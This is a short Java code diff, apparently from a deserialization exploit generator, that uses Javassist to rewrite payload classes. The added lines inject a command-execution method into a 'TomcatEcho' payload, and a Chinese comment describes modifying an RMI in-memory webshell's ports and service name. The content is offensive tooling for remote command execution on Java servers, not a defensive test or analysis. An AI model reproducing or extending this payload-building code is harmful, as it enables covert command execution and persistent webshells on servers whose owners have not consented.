@@ -195,7 +195,12 @@ public class Gadgets {
 			String className = myClass.getName();
 			ctClass = pool.get(className);
 
-			if (className.contains("RMIBindTemplate")) {
+			// 动态为 TomcatEcho 添加执行命令功能
+			if (className.contains("TomcatEcho")) {
+				insertCMD(ctClass);
+				ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");
+
+			} else if (className.contains("RMIBindTemplate")) {
 				// 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法
 
 				if (IS_INHERIT_ABSTRACT_TRANSLET) {
